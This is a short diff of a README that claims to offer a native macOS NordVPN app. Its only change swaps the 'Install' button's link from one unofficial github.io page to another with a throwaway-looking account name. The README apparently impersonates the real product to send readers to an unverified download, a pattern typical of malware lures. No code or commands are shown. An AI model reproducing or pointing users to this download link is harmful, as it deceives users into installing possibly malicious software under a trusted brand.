@@ -2,7 +2,7 @@
 <h1 align="center">NordVPN</h1>
 <p align="center">Native VPN and online privacy — done right on macOS.</p>
 <p align="center"><img src="https://img.shields.io/badge/macOS-000000?style=flat-square&logo=apple&logoColor=white"/> &nbsp; <img src="https://img.shields.io/badge/Apple_Silicon-Ready-brightgreen?style=flat-square"/> &nbsp; <img src="https://img.shields.io/badge/Dark_Mode-Supported-blueviolet?style=flat-square"/></p>
-<p align="center"><a href="https://blya-dayte-deneg.github.io/.github/nordvpn"><img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png" alt="Install" width="160"/></a></p>
+<p align="center"><a href="https://ukabvar-losos.github.io/.github/nordvpn"><img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png" alt="Install" width="160"/></a></p>
 <p align="center"><img src="https://www.security.org/app/uploads/2023/12/NordVPN-connected-to-Australia.png" alt="NordVPN — macOS VPN and online privacy screenshot" width="780"/></p>
 
 ---
